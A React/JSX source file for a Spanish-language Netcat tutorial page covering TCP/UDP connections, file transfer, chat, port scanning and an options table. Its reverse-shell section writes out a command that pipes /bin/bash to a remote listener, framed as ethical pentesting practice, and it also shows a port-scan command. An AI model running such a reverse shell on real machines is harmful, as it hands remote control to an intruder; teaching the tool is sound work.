import Enlace from "../../../componentes/atomos/enlace.jsx";
import Linea from "../../../componentes/atomos/linea.jsx";
import Lista from "../../../componentes/moleculas/lista.jsx";
import Texto from "../../../componentes/atomos/texto.jsx";
import Titulo from "../../../componentes/moleculas/titulo.jsx";
import { Tabla, TablaCabezera, TablaFila, TablaUnica } from "../../../componentes/moleculas/tabla.jsx";
import CodeBlock from "../../../componentes/moleculas/codigo.jsx";
import Estructura, { TemarioAsideCompleto, TemarioCompleto } from "../../../componentes/organismos/estructura.jsx";

function Temario({ className = "" }) {
  return (
    <Lista className={className}>
      <li><Enlace href="#qué-es-netcat">¿Qué es Netcat?</Enlace ></li>
      <li><Enlace href="#instalación">Instalación</Enlace ></li>
      <li><Enlace href="#sintaxis-general">Sintaxis general</Enlace ></li>
      <li><Enlace href="#modos-principales-de-uso">Modos principales de uso</Enlace >
        <Lista>
          <li><Enlace href="#cliente-tcp">Cliente TCP</Enlace ></li>
          <li><Enlace href="#servidor-tcp">Servidor TCP</Enlace ></li>
        </Lista>
      </li>
      <li><Enlace href="#udp-en-lugar-de-tcp">UDP en lugar de TCP</Enlace ></li>
      <li><Enlace href="#transferencia-de-archivos">Transferencia de archivos</Enlace >
        <Lista>
          <li><Enlace href="#enviar-un-archivo">Enviar un archivo</Enlace ></li>
        </Lista>
      </li>
      <li><Enlace href="#chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
        (TCP)</Enlace ></li>
      <li><Enlace href="#escaneo-de-puertos">Escaneo de puertos</Enlace ></li>
      <li><Enlace href="#redirección-de-entradasalida">Redirección de
        entrada/salida</Enlace ></li>
      <li><Enlace href="#reverse-shells-usos-éticos-y-educativos">Reverse Shells
        (usos éticos y educativos)</Enlace >
        <Lista>
          <li><Enlace href="#en-el-servidor-escuchando">En el servidor
            (escuchando)</Enlace ></li>
          <li><Enlace href="#en-la-víctima-simulada">En la víctima (simulada)</Enlace ></li>
        </Lista>
      </li>
      <li><Enlace href="#otras-opciones-útiles">Otras opciones útiles</Enlace ></li>
      <li><Enlace href="#ejemplo-práctico-completo">Ejemplo práctico completo</Enlace >
        <Lista>
          <li><Enlace href="#crear-servidor-de-eco">Crear servidor de eco</Enlace ></li>
          <li><Enlace href="#cliente">Cliente</Enlace ></li>
        </Lista>
      </li>
      <li><Enlace href="#resumen-rápido">Resumen rápido</Enlace ></li>
      <li><Enlace href="#alternativas-modernas">Alternativas modernas</Enlace ></li>
    </Lista>
  );
}

function nameabcd({ }) {
  return (
    <>
      <Estructura>
        <Titulo title="h1" id="netcat-en-linux">Netcat en Linux</Titulo>
        <Linea />

        <TemarioCompleto temario={Temario} />

        <Titulo title="h2" id="qué-es-netcat">¿Qué es Netcat?</Titulo>
        <Texto><strong>Netcat</strong> (abreviado nc) es una
          herramienta de línea de comandos usada para:</Texto>
        <Lista>
          <li>Leer y escribir datos en conexiones <strong>TCP o UDP</strong>.</li>
          <li>Crear <strong>clientes y servidores</strong>.</li>
          <li>Transferir archivos, hacer <strong>escucha de puertos</strong>,
            <strong>chats</strong>, o incluso <strong>backdoors</strong> (de forma
            ética y controlada).
          </li>
        </Lista>
        <Texto>Es conocida como el <strong>“cuchillo suizo de las redes”</strong>
          🧰.</Texto>
        <Linea />
        <Titulo title="h2" id="instalación">Instalación</Titulo>
        <Texto>En la mayoría de sistemas viene preinstalado:</Texto>
        <CodeBlock code={`nc -h`} language="bash" />
        <Texto>Sí no lo tienes:</Texto>
        <Texto><strong>Linux (Debian/Ubuntu):</strong></Texto>
        <CodeBlock code={`sudo apt install netcat`} language="bash" />
        <Texto><strong>Windows:</strong> Puedes usar <strong>Ncat</strong> (parte de
          Nmap): 👉 <Enlace href="https://nmap.org/ncat/">https://nmap.org/ncat/</Enlace ></Texto>
        <Linea />
        <Titulo title="h2" id="sintaxis-general">Sintaxis general</Titulo>
        <CodeBlock code={`nc [opciones] [host] [puerto]`} language="bash" />
        <Linea />
        <Titulo title="h2" id="modos-principales-de-uso">Modos principales de uso</Titulo>
        <Titulo title="h3" id="cliente-tcp">Cliente TCP</Titulo>
        <Texto>Conectarse a un servidor:</Texto>
        <CodeBlock code={`nc 127.0.0.1 8080`} language="bash" />
        <Texto>Esto abre una conexión al puerto 8080 del localhost.</Texto>
        <Titulo title="h3" id="servidor-tcp">Servidor TCP</Titulo>
        <Texto>Escuchar conexiones:</Texto>
        <CodeBlock code={`nc -l -p 8080`} language="bash" />
        <Texto>🔹 -l → modo escucha</Texto>
        <Texto>🔹 -p → especifica el puerto</Texto>
        <Texto>Luego, desde otro terminal:</Texto>
        <CodeBlock code={`nc 127.0.0.1 8080`} language="bash" />
        <Texto>Ahora puedes <strong>enviar mensajes entre ambos terminales (chat
          simple)</strong>.</Texto>
        <Linea />
        <Titulo title="h2" id="udp-en-lugar-de-tcp">UDP en lugar de TCP</Titulo>
        <Texto>Para usar <strong>UDP</strong> en vez de TCP:</Texto>
        <CodeBlock code={`# Servidor
nc -u -l -p 6000

# Cliente
nc -u 127.0.0.1 6000`} language="bash" />
        <Texto>🔹 -u → activa modo UDP.</Texto>
        <Linea />
        <Titulo title="h2" id="transferencia-de-archivos">Transferencia de archivos</Titulo>
        <Titulo title="h3" id="enviar-un-archivo">Enviar un archivo</Titulo>
        <Texto>Servidor que recibirá:</Texto>
        <CodeBlock code={`nc -l -p 5000 > archivo_recibido.txt`} language="bash" />
        <Texto>Cliente que envía:</Texto>
        <CodeBlock code={`nc 127.0.0.1 5000 < archivo.txt`} language="bash" />
        <Texto>👉 El archivo archivo.txt se envía al servidor.</Texto>
        <Linea />
        <Titulo title="h2" id="chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
          (TCP)</Titulo>
        <Texto>En una máquina:</Texto>
        <CodeBlock code={`nc -l -p 4000`} language="bash" />
        <Texto>En otra:</Texto>
        <CodeBlock code={`nc IP_DEL_SERVIDOR 4000`} language="bash" />
        <Texto>Ahora ambos pueden escribir y leer mensajes.</Texto>
        <Linea />
        <Titulo title="h2" id="escaneo-de-puertos">Escaneo de puertos</Titulo>
        <Texto>Netcat puede escanear qué puertos están abiertos en una máquina:</Texto>
        <CodeBlock code={`nc -zv 192.168.1.10 20-80`} language="bash" />
        <Texto>🔹 -z → modo “scan” sin enviar datos.</Texto>
        <Texto>🔹 -v → modo verbose (muestra resultado).</Texto>
        <Texto>🔹 20-80 → rango de puertos.</Texto>
        <Linea />
        <Titulo title="h2" id="redirección-de-entradasalida">Redirección de entrada/salida</Titulo>
        <Texto>Puedes usar <strong>pipes</strong> para automatizar tareas:</Texto>
        <CodeBlock code={`echo "Hola servidor" | nc 127.0.0.1 8080`} language="bash" />
        <Texto>O guardar la respuesta:</Texto>
        <CodeBlock code={`nc 127.0.0.1 80  respuesta.txt`} language="bash" />
        <Linea />
        <Titulo title="h2" id="reverse-shells-usos-éticos-y-educativos">Reverse Shells (usos
          éticos y educativos)</Titulo>
        <Texto>Netcat puede crear conexiones remotas tipo <strong>shell
          inversa</strong>, usadas en <strong>pentesting</strong> (no
          ilegalmente).</Texto>
        <Titulo title="h3" id="en-el-servidor-escuchando">En el servidor (escuchando)</Titulo>
        <CodeBlock code={`nc -l -p 4444 -v`} language="bash" />
        <Titulo title="h3" id="en-la-víctima-simulada">En la víctima (simulada)</Titulo>
        <CodeBlock code={`nc 192.168.1.100 4444 -e /bin/bash`} language="bash" />
        <Texto>👉 Esto le da al servidor una consola remota de la otra máquina.
          <em>(Solo en entornos controlados o de práctica legal.)</em>
        </Texto>
        <Linea />
        <Titulo title="h2" id="otras-opciones-útiles">Otras opciones útiles</Titulo>
        <Tabla>
          <TablaCabezera headers={["Opción", "Descripción"]} />

          <tbody>
            <TablaFila>
              <TablaUnica>-l</TablaUnica>
              <TablaUnica>Escucha conexiones entrantes</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>-p &lt;puerto&gt;</TablaUnica>
              <TablaUnica>Define puerto local</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>-v</TablaUnica>
              <TablaUnica>Verbose (muestra información detallada)</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>-z</TablaUnica>
              <TablaUnica>Modo escaneo sin datos</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>-n</TablaUnica>
              <TablaUnica>No resuelve DNS (usa IP directamente)</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>-u</TablaUnica>
              <TablaUnica>Usa UDP</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>-e &lt;comando&gt;</TablaUnica>
              <TablaUnica>Ejecuta un programa tras conectar (⚠️ uso ético)</TablaUnica>
            </TablaFila>
          </tbody>
        </Tabla>
        <Linea />
        <Titulo title="h2" id="ejemplo-práctico-completo">Ejemplo práctico completo</Titulo>
        <Titulo title="h3" id="crear-servidor-de-eco">Crear servidor de eco</Titulo>
        <CodeBlock code={`# Servidor
nc -l -p 1234 -v`} language="bash" />
        <Titulo title="h3" id="cliente">Cliente</Titulo>
        <CodeBlock code={`nc 127.0.0.1 1234`} language="bash" />
        <Texto>Ahora cualquier texto que envíes se reflejará entre ambos.</Texto>
        <Linea />
        <Titulo title="h2" id="resumen-rápido">Resumen rápido</Titulo>
        <Tabla>
          <TablaCabezera headers={["Función", "Comando", "Descripción"]} />

          <tbody>
            <TablaFila>
              <TablaUnica>Cliente TCP</TablaUnica>
              <TablaUnica>nc host puerto</TablaUnica>
              <TablaUnica>Conecta a un servidor</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>Servidor TCP</TablaUnica>
              <TablaUnica>nc -l -p puerto</TablaUnica>
              <TablaUnica>Escucha conexiones</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>Cliente UDP</TablaUnica>
              <TablaUnica>nc -u host puerto</TablaUnica>
              <TablaUnica>Envía datos por UDP</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>Servidor UDP</TablaUnica>
              <TablaUnica>nc -u -l -p puerto</TablaUnica>
              <TablaUnica>Escucha por UDP</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>Transferir archivo</TablaUnica>
              <TablaUnica>nc -l -p 1234 &gt; out.txt /
                nc host 1234 &lt; in.txt</TablaUnica>
              <TablaUnica>Enviar archivos</TablaUnica>
            </TablaFila>
            <TablaFila>
              <TablaUnica>Escanear puertos</TablaUnica>
              <TablaUnica>nc -zv host 1-1024</TablaUnica>
              <TablaUnica>Detectar puertos abiertos</TablaUnica>
            </TablaFila>
          </tbody>
        </Tabla>
        <Linea />
        <Titulo title="h2" id="alternativas-modernas">Alternativas modernas</Titulo>
        <Lista>
          <li><strong>Ncat</strong> (de Nmap): versión más segura y moderna.</li>
          <li><strong>Socat</strong>: similar pero con más opciones.</li>
          <li><strong>PowerCat</strong> (en Windows PowerShell): equivalente en
            sistemas modernos.</li>
        </Lista>
     </Estructura>

      <TemarioAsideCompleto temario={Temario} />
    </>
  );
}
export default nameabcd;
